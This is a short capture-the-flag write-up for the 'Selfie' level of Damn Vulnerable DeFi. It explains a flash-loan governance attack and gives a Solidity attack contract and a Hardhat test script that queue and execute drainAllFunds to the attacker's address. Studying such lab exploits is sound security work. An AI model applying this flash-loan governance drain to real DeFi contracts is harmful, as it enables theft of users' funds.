# Selfie

1. The `SelfiePool.sol` have typical `flashLoan` function and `drainAllFunds` which can only be called by governance contract. The `SimpleGovernance.sol` contract allow us to propose an action trough `queueAction` as long as we have more than half of DVT total supply and target call is not the governance contract itself. With this, we can `flashLoan` from pool and then call `queueAction` that contain call to the pool to `drainAllFunds` and send the fund to our address. But we have to wait `2 days` to execute the action.

```solidity
    function attack(uint256 borrowAmount) external {
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        actionId = gov.queueAction(address(pool), data, 0);
        IERC20(tokenAddress).transfer(address(pool), amount);
    }

    function execute() external {
        gov.executeAction(actionId);
    }
```

The javascript test script :

```javascript
/** CODE YOUR EXPLOIT HERE */
const SelfieAttack = await ethers.getContractFactory("SelfieAttack", attacker);
this.selfieAttack = await SelfieAttack.deploy(
  this.governance.address,
  this.pool.address
);
// do a flash loan and propose gov action
await this.selfieAttack.attack(TOKENS_IN_POOL);
// wait till two days
await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
await this.selfieAttack.execute();
```
